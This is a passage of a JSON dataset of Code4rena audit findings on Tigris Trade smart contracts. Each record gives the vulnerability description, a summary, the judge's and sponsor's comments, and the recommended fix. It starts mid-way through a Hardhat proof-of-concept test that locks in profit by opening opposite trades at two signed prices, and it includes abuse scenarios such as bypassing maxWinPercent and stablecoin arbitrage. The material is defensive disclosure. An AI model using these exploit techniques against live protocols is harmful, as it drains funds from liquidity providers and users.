other price such as (950, 960), just ensure enough margin\n      let closePrice = parseEther(\"1050\");\n      let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];\n      let closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, closePrice, 0, 2000000100, false]\n        )\n      );\n      let closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n      \n      let balanceBefore = await stabletoken.balanceOf(owner.address);\n\n      // close long with high price\n      await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n\n\n      closePrice = parseEther(\"1040\");\n      closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];\n      closeMessage = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          [node.address, 1, closePrice, 0, 2000000100, false]\n        )\n      );\n      closeSig = await node.signMessage(\n        Buffer.from(closeMessage.substring(2), 'hex')\n      );\n      // close short with low price\n      await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);\n      let balanceAfter = await stabletoken.balanceOf(owner.address);\n      let principal = parseEther(\"1000\").add(parseEther(\"1010\"));\n\n      let profit = balanceAfter.sub(balanceBefore).sub(principal);\n      expect(profit.gt(parseEther(`100`))).to.equal(true);\n    });\n\n  });\n});\n\n\n```\n\nHow to run\n\nPut the test case to a new BypassDelayCheck.js file of test directory, and run:\n\n    npx hardhat test\n\nAnd the test result will be:\n\n      Bypass delay check to earn risk free profit\n        Simulate long with low price and short with high price at the same tx to lock profit\n           Exit at any price to take profit\n           Exit with another price pair to double profit\n\n### Tools Used\n\nVS Code, Hardhat\n\n### Recommended Mitigation Steps\n\nCache recent lowest and highest prices, open long order with the highest price and short order with the lowest price.\n\n**[TriHaz (Tigris Trade) disputed and  commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/108#issuecomment-1375828833):**\n > We don't think this is valid as price sig expires in a very small window that would prevent a big price difference that could work in the same transaction to long & short.\n >\n> Also we have spread and funding fees that would make this so hard to be profitable.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/108#issuecomment-1383763386):**\n > The finding is effectively saying that while a delay exist, it doesn't truly offer any security guarantees because a trader could just open a trade on both sides, by using 2 different prices that are active at the same time.\n> \n> Anytime the spread between the prices, magnified by leverage, is higher than the fees, the trade is profitable (an arbitrage) at the disadvantage of the LPers.\n> \n> I think we don't have sufficient information to irrevocably mark this as a security vulnerability (just like there's no guarantee of prices being active once at a time, there's no guarantee there won't be).\n> \n> For this reason, I believe the finding to be valid and of Medium Severity.\n> \n> The finding is worth investigating once the system is deployed as it's reliant on settings and oracle behaviour\n\n**[GainsGoblin (Tigris Trade) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/108#issuecomment-1406969496):**\n > Oracle behaviour can easily mitigate this issue by setting appropriate spreads based on price movement, however there is nothing to be done in the contracts.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the \"Trading.sol\" code in the \"2022-12-tigris\" GitHub repository. It allows an attacker to exploit the \"_checkDelay()\" function and open a long order with a low price and a short order with a high price in the same transaction to lock in a risk-free profit. The proof of concept test case was written using the hardhat framework and VS Code. The test results showed that the attacker could take a profit of more than 50 ETH if they closed at any price, or double their profit if they closed at different prices.\n\nThe recommended mitigation steps are to cache recent lowest and highest prices, and open long orders with the highest price and short orders with the lowest price.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/108",
      "tags": [],
      "finders": [
        "0x52",
        "orion",
        "noot",
        "KingNFT",
        "chaduke",
        "Critical"
      ]
    },
    {
      "id": "6332",
      "title": "[M-02] Must approve 0 first",
      "impact": "MEDIUM",
      "content": "\nSome tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value. They must first be approved by zero and then the actual allowance must be approved.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117>\n\n```solidity\n    function claimGovFees() public {\n        address[] memory assets = bondNFT.getAssets();\n\n        for (uint i=0; i < assets.length; i++) {\n            uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));\n            IGovNFT(govNFT).claim(assets[i]);\n            uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));\n            IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);// @audit this could fail always with some tokens, \n            bondNFT.distribute(assets[i], balanceAfter - balanceBefore);\n        }\n    }\n```\n\n### Recommended Mitigation Steps\n\nAdd an `approve(0)` before approving;\n\n        function claimGovFees() public {\n            address[] memory assets = bondNFT.getAssets();\n\n            for (uint i=0; i < assets.length; i++) {\n                uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));\n                IGovNFT(govNFT).claim(assets[i]);\n                uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));\n                IERC20(assets[i]).approve(address(bondNFT), 0);\n                IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);\n                bondNFT.distribute(assets[i], balanceAfter - balanceBefore);\n            }\n      }\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/104#issuecomment-1382253859):**\n > The Warden has shown how, due to the function approving max multiple times, certain tokens, that only allow a non-zero allowance to be set starting from zero, could revert.\n> \n> Because this depends on the token implementation, but there's a reasonable chance to believe that USDT will be used, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/104#issuecomment-1406959434):**\n > Since the purpose of the bonds is to lock tigAsset liquidity, only tigAsset tokens will be allowed to be locked, which don't have this issue.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/104#issuecomment-1407862000):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177578 \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue that affects some tokens (like USDT) when changing the allowance from an existing non-zero allowance value. It was discovered when manually revising the code found at https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117. The impact of this bug is that the tokens do not work when changing the allowance from an existing non-zero allowance value. The recommended mitigation step is to add an approve(0) before approving. This can be done by modifying the code as follows: \n\n```\n    function claimGovFees() public {\n        address[] memory assets = bondNFT.getAssets();\n\n        for (uint i=0; i < assets.length; i++) {\n            uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));\n            IGovNFT(govNFT).claim(assets[i]);\n            uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));\n            IERC20(assets[i]).approve(address(bondNFT), 0);\n            IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);\n            bondNFT.distribute(assets[i], balanceAfter - balanceBefore);\n        }\n    }\n```",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/104",
      "tags": [],
      "finders": [
        "__141345__",
        "Deivitto",
        "0x4non",
        "0xNazgul",
        "cccz",
        "kwhuo68",
        "imare",
        "rvierdiiev",
        "eierina"
      ]
    },
    {
      "id": "6331",
      "title": "[M-01] Lock.sol: claimGovFees function can cause assets to be stuck in the Lock contract",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215>\n\n### Impact\n\nWhen calling [`Lock.claimGovFees`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110), assets that are set to be not allowed or assets that don't have any shares yet in the `BondNFT` contract will cause a silent failure in [`BondNFT.distribute`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215).\n\nThe funds from the `GovNFT` contract will get transferred into the `Lock` contract and then will be stuck there. They cannot be recovered.\n\n### Proof of Concept\n\n1.  An asset is added to the `BondNFT` contract by calling [`BondNFT.addAsset`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349)\n2.  There are no bonds yet for this asset so the amount of shares for the asset is zero\n3.  [`Lock.claimGovFees`](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110) is called\n4.  Funds are transferred from the `GovNFT` contract to the [`Lock` contract](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115)\n5.  The call to `BondNFT.distribute` now fails quietly without reverting the transaction:\n    ```solidity\n     if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n    ```\n6.  The funds are now stuck in the `Lock` contract. They cannot be recovered.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nA naive solution would be to use `revert` instead of `return` in `BondNFT.distribute` such that funds are either transferred from `GovNFT` to `Lock` and then to `BondNFT` or not at all.\n\n```solidity\n     ) external {\n-        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;\n+        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) revert;\n         IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);\n         unchecked {\n             uint aEpoch = block.timestamp / DAY;\n```\n\nThis however is an incomplete fix because if there is a single \"bad\" asset, rewards for the other assets cannot be distributed either.\n\nMoreover functions like `Lock.lock` and `Lock.release` rely on `Lock.claimGovFees` to not revert.\n\nSo you might allow the owner to rescue stuck tokens from the `Lock` contract. Of course only allow rescuing the balance of the `Lock` contract minus the `totalLocked` of the asset in the `Lock` contract such that the locked amount cannot be rescued.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1362229612):**\n > Looks off, the transferFrom would happen [after the check](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215).\n> \n> If `totalShares` is zero, the funds will not be pulled.\n> \n> Will double check but looks invalid.\n\n**[TriHaz (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1363636606):**\n > @Alex the Entreprenerd it is valid, funds will not be pulled to `BondNFT`, but they will be stuck in `Lock`.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1384498101):**\n > The warden has shown how, whenever the `totalShares` for an asset are zero, or an asset is not allowed, the call to distribute will result in a no-op.\n >\n> Because `claimGovFees` uses a delta balance, this means that those tokens will be stuck in the Lock Contract.\n> \n> Because this finding shows a way to lose yield, due to an external condition, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/73#issuecomment-1407131168):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173369 \n\n\n\n***\n\n",
      "summary": "\nThis bug report describes an issue in the code of the Lock and BondNFT contracts. When the Lock.claimGovFees function is called, assets that are set to be not allowed or assets that don't have any shares yet in the BondNFT contract will cause a silent failure in BondNFT.distribute. This means that the funds from the GovNFT contract will get transferred into the Lock contract and then will be stuck there. The funds cannot be recovered.\n\nThe bug report provides a proof of concept which outlines the steps that need to be taken to reproduce the bug. It also provides the tools used to identify the bug.\n\nThe recommended mitigation steps suggest that a naive solution would be to use revert instead of return in BondNFT.distribute, such that funds are either transferred from GovNFT to Lock and then to BondNFT or not at all. However, this is an incomplete fix because if there is a single \"bad\" asset, rewards for the other assets cannot be distributed either. The bug report also suggests that the owner should be allowed to rescue stuck tokens from the Lock contract.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/73",
      "tags": [],
      "finders": [
        "__141345__  0xdeadbeef0x",
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "6330",
      "title": "[H-11] Not enough margin pulled or burned from user when adding to a position",
      "impact": "HIGH",
      "content": "\nWhen adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol, lowering the collateralization ratio of `tigAsset`.\n\n### Proof of Concept\n\nIn `Trading.addToPosition` the `_handleDeposit` function is called like this:\n\n```js\n_handleDeposit(\n    _trade.tigAsset,\n    _marginAsset,\n    _addMargin - _fee,\n    _stableVault,\n    _permitData,\n    _trader\n);\n```\n\nThe third parameter with the value of `_addMargin - _fee` is the amount pulled (or burned in the case of using `tigAsset`) from the user. The `_fee` value is calculated as part of the position size like this:\n\n```js\nuint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);\n```\n\nThe `_handleOpenFees` function mints `_tigAsset` to the referrer, to the `msg.sender` (if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the `_addMargin` value paid by the user. Hence using `_addMargin - _fee` as the third parameter to `_handleDeposit` is going to pull or burn less margin than what was accounted for.\n\nAn example for correct usage can be seen in `initiateMarketOrder`:\n\n```js\nuint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\nuint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n_handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n```\n\nHere the third parameter to `_handleDeposit` is not `_marginAfterFees` but `_tradeInfo.margin` which is what the user has input on and is supposed to pay.\n\n### Recommended Mitigation Steps\n\nIn `Trading.addToPosition` call the `_handleDeposit` function without subtracting the `_fee` value:\n\n```js\n_handleDeposit(\n    _trade.tigAsset,\n    _marginAsset,\n    _addMargin,\n    _stableVault,\n    _permitData,\n    _trader\n);\n```\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1374444369)**\n\n**[Alex the Entreprenerd (judge) increased severity to High and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1387116632):**\n > The Warden has shown how, due to an incorrect computation, less margin is used when adding to a position.\n> \n> While the loss of fees can be considered Medium Severity, I believe that the lack of checks is ultimately allowing for more leverage than intended which not only breaks invariants but can cause further issues (sponsor cited Fees as a defense mechanism against abuse).\n> \n> For this reason, I believe the finding to be of High Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/659#issuecomment-1407828021):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177303 \n\n***\n\n \n",
      "summary": "\nThis bug report is regarding a vulnerability in the code of the Trading.sol file. The vulnerability could lead to value leaking from the protocol and lowering the collateralization ratio of tigAsset. This is because when adding to a position, the amount of margin pulled from the user is not as much as it should be. \n\nThe issue is that in the _handleDeposit function, the third parameter is set to _addMargin - _fee, where the _fee value is calculated as part of the position size. This is incorrect as the _fee value should be part of the _addMargin value paid by the user. \n\nThe recommended mitigation step is to call the _handleDeposit function without subtracting the _fee value. This should be done in the Trading.addToPosition function. \n\nOverall, this bug report is about a vulnerability in the Trading.sol file which could lead to value leaking from the protocol and lowering the collateralization ratio of tigAsset. The recommended mitigation step is to call the _handleDeposit function without subtracting the _fee value.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/659",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "Jeiwan",
        "bin2chen",
        "Aymen0909",
        "KingNFT",
        "hansfriese",
        "rvierdiiev",
        "minhtrng",
        "0Kage"
      ]
    },
    {
      "id": "6329",
      "title": "[H-10] User can abuse tight stop losses and high leverage to make risk free trades",
      "impact": "HIGH",
      "content": "\nUser can abuse how stop losses are priced to open high leverage trades with huge upside and very little downside.\n\n### Proof of Concept\n\n    function limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        _checkDelay(_id, false);\n        (uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);\n        _closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);\n    }\n\n    function _limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) external view returns(uint _limitPrice, address _tigAsset) {\n        _checkGas();\n\n        IPosition.Trade memory _trade = position.trades(_id);\n        _tigAsset = _trade.tigAsset;\n        getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n        uint256 _price = _priceData.price;\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        if (_tp) {\n            if (_trade.tpPrice == 0) revert(\"7\"); //LimitNotSet\n            if (_trade.direction) {\n                if (_trade.tpPrice > _price) revert(\"6\"); //LimitNotMet\n            } else {\n                if (_trade.tpPrice < _price) revert(\"6\"); //LimitNotMet\n            }\n            _limitPrice = _trade.tpPrice;\n        } else {\n            if (_trade.slPrice == 0) revert(\"7\"); //LimitNotSet\n            if (_trade.direction) {\n                if (_trade.slPrice < _price) revert(\"6\"); //LimitNotMet\n            } else {\n                if (_trade.slPrice > _price) revert(\"6\"); //LimitNotMet\n            }\n            //@audit stop loss is closed at user specified price NOT market price\n            _limitPrice = _trade.slPrice;\n        }\n    }\n\nWhen closing a position with a stop loss the user is closed at their SL price rather than the current price of the asset. A user could abuse this in directional markets with high leverage to make nearly risk free trades. A user could open a long with a stop loss that in $0.01 below the current price. If the price tanks immediately on the next update then they will be closed out at their entrance price, only out the fees to open and close their position. If the price goes up then they can make a large gain.\n\n### Recommended Mitigation Steps\n\nTake profit and stop loss trades should be executed at the current price rather than the price specified by the user:\n\n             if (_trade.tpPrice == 0) revert(\"7\"); //LimitNotSet\n            if (_trade.direction) {\n                if (_trade.tpPrice > _price) revert(\"6\"); //LimitNotMet\n            } else {\n                if (_trade.tpPrice < _price) revert(\"6\"); //LimitNotMet\n            }\n    -       _limitPrice = _trade.tpPrice;\n    +       _limitPrice = _price;\n        } else {\n            if (_trade.slPrice == 0) revert(\"7\"); //LimitNotSet\n            if (_trade.direction) {\n                if (_trade.slPrice < _price) revert(\"6\"); //LimitNotMet\n            } else {\n                if (_trade.slPrice > _price) revert(\"6\"); //LimitNotMet\n            }\n    -       _limitPrice = _trade.slPrice;\n    +       _limitPrice = _price;\n\n**[TriHaz (Tigris Trade) disputed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/622#issuecomment-1377385352):**\n > Because of open fees, close fees and spread, that wouldn't be profitable.\n >\n> We also have a cooldown after a trade is opened so there will be enough time for price to move freely past the sl.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/622#issuecomment-1385147387):**\n > The warden has shown a flaw in how the protocol offers Stop Losses.\n> \n> By using the originally stored value for Stop Loss, instead of just using it as a trigger, an attacker can perform a highly profitable strategy on the system as they know that their max risk is capped by the value of the Stop Loss, instead of the current asset price.\n> \n> This will happen at the detriment of LPs.\n> \n> Because the attack breaks an important invariant, causing a loss to other users, I agree with High Severity.\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that allows users to abuse how stop losses are priced to open high leverage trades with huge upside and very little downside. This is done by allowing users to close their positions at their stop loss or take profit price rather than the current market price when the order is executed. This could be abused in directional markets with high leverage to make nearly risk free trades. \n\nThe recommended mitigation steps to fix this vulnerability is to take profit and stop loss trades should be executed at the current price rather than the price specified by the user. This can be done by replacing the code that sets the limit price to the user specified price with the code that sets the limit price to the current market price.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/622",
      "tags": [],
      "finders": [
        "0x52",
        "hansfriese  noot"
      ]
    },
    {
      "id": "6328",
      "title": "[H-09] Users can bypass the maxWinPercent limit using a partially closing",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L625-L627\n\n\n## Vulnerability details\n\n## Impact\nUsers can bypass the `maxWinPercent` limit using a partial closing.\n\nAs a result, users can receive more funds than their upper limit from the protocol.\n\n## Proof of Concept\nAs we can see from the [documentation](https://docs.tigris.trade/protocol/trading-and-fees#limitations), there is limitation of a maximum PnL.\n\n```\nMaximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually.\n```\n\nAnd this logic was implemented like below in `_closePosition()`.\n\n```solidity\nFile: 2022-12-tigris\\contracts\\Trading.sol\n624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n625:                 if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit\n626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n627:                 }\n```\n\nBut it checks the `maxWinPercent` between the partial payout and full margin so the below scenario is possible.\n\n1. Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees.\n2. If `maxWinPercent` = 500%, Alice should receive 500 at most.\n3. But Alice closed 50% of the position and she got 500 for a 50% margin because it checks `maxWinPercent` with `_toMint = 500` and `_trade.margin = 100`\n4. After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again.\n5. As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nWe should check the `maxWinPercent` between the partial payout and partial margin like below.\n\n```solidity\n    _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n\n    uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT; //+++++++++++++++++++++++\n    if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) { \n        _toMint = partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;\n    }\n```",
      "summary": "\nThis bug report concerns the code found in the Trading.sol file of the 2022-12-tigris repository on Github. It states that users can bypass the `maxWinPercent` limit set by the protocol with a partial closing. This means that the user can receive more funds than their upper limit from the protocol.\n\nThe bug is demonstrated by the following scenario: Alice opens an order with a margin of 100 and PnL of 1000. With a `maxWinPercent` of 500%, Alice should receive a maximum of 500. However, if Alice closes 50% of the position, she can receive 500 for a 50% margin because the `maxWinPercent` is checked with the `_toMint = 500` and `_trade.margin = 100`. This can be repeated, allowing Alice to withdraw almost 100% of the initial PnL (1000) even though she should only receive 500.\n\nThe bug was found through manual review. The recommended mitigation step is to check the `maxWinPercent` between the partial payout and partial margin. This can be done by adding the line `uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT;` and changing the if statement to `if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) {`.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/507",
      "tags": [],
      "finders": [
        "0xA5DF",
        "bin2chen",
        "0x52",
        "hansfriese"
      ]
    },
    {
      "id": "6327",
      "title": "[H-08] Incorrect Assumption of Stablecoin Market Stability",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72>\n\n### Impact\n\nThe `StableVault` contract attempts to group all types of stablecoins under a single token which can be minted for any of the stablecoins supported by the system as well as burned for any of them.\n\nThis is at minimum a medium-severity vulnerability as the balance sheet of the `StableVault` will consist of multiple assets which do not have a one-to-one exchange ratio between them as can be observed by trading pools such as [Curve](https://curve.fi/#/ethereum/pools/3pool/deposit) as well as the [Chainlink oracle reported prices themselves](https://data.chain.link/ethereum/mainnet/stablecoins/usdc-usd).\n\nGiven that the contract exposes a 0% slippage 1-to-1 exchange between assets that in reality have varying prices, the balance sheet of the contract can be arbitraged (especially by flash-loans) to swap an undesirable asset (i.e. USDC which at the time of submission was valued at `0.99994853` USD) for a more desirable asset (i.e. USDT which at the time of submission was valued at `1.00000000` USD) acquiring an arbitrage in the price by selling the traded asset.\n\n### Proof of Concept\n\nTo illustrate the issue, simply view the exchange output you would get for swapping your USDC to USDT in a stablecoin pool (i.e. CurveFi) and then proceed to [invoke `deposit`](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51) with your USDC asset and retrieve your [incorrectly calculated `USDT` equivalent via `withdraw`](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72).\n\nThe arbitrage can be observed by assessing the difference in the trade outputs and can be capitalized by selling our newly acquired `USDT` for `USDC` on the stablecoin pair we assessed earlier, ultimately ending up with a greater amount of `USDC` than we started with. This type of attack can be extrapolated by utilizing a flash-loan rather than our personal funds.\n\n### Tools Used\n\n[Chainlink oracle resources](https://data.chain.link/popular)\n\n[Curve Finance pools](https://curve.fi/#/ethereum/pools)\n\n### Recommended Mitigation Steps\n\nWe advise the `StableVault` to utilize Chainlink oracles for evaluating the inflow of assets instead, ensuring that all inflows and outflows of stablecoins are fairly evaluated based on their \"neutral\" USD price rather than their subjective on-chain price or equality assumption.\n\n**[Alex the Entreprenerd (judge) increased severity to High and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/462#issuecomment-1359639245):**\n > The warden has shown how, due to an incorrect assumption, the system offers infinite leverage.\n> \n> This can be trivially exploited by arbitraging with any already available exchange.\n> \n> Depositors will incur a loss equal to the size of the arbitrage as the contract is always taking the losing side.\n> \n> I believe this should be High because of it's consistently losing nature.\n\n**[TriHaz (Tigris Trade) acknowledged and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/462#issuecomment-1377373227):**\n > We are aware of this issue, we will keep the vault with one token for now.\n\n\n***\n\n",
      "summary": "\nThe StableVault contract attempts to group all types of stablecoins under a single token, which can be minted or burned for any of the supported stablecoins. This is a medium-severity vulnerability as the balance sheet of the contract consists of multiple assets which do not have a one-to-one exchange ratio between them. This means that the contract exposes a 0% slippage 1-to-1 exchange between assets that in reality have varying prices. This can be exploited by an attacker to arbitrage the balance sheet of the contract, especially using flash-loans, to swap an undesirable asset for a more desirable one and gain an arbitrage in the price.\n\nTo illustrate the issue, the attacker can simply view the exchange output they would get for swapping their USDC to USDT in a stablecoin pool and then invoke the deposit with their USDC asset and withdraw the incorrectly calculated USDT equivalent. The arbitrage can be observed by assessing the difference in the trade outputs and can be capitalized by selling the newly acquired USDT for USDC on the stablecoin pair.\n\nThe issue was identified by manual review of the codebase, Chainlink oracle resources, and Curve Finance pools. To mitigate the issue, it is advised to utilize Chainlink oracles for evaluating the inflow of assets instead, ensuring that all inflows and outflows of stablecoins are fairly evaluated based on their \"neutral\" USD price rather than their subjective on-chain price or equality assumption.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/462",
      "tags": [],
      "finders": [
        "8olidity",
        "__141345__",
        "0xhacksmithh",
        "Secureverse",
        "SamGMK",
        "rotcivegaf",
        "Ruhum",
        "0xsomeone",
        "Tointer",
        "aviggiano",
        "Critical"
      ]
    },
    {
      "id": "6326",
      "title": "[H-07] reentrancy attack during mint() function in Position contract which can lead to removing of the other users limit orders or stealing contract funds because initId is set low value",
      "impact": "HIGH",
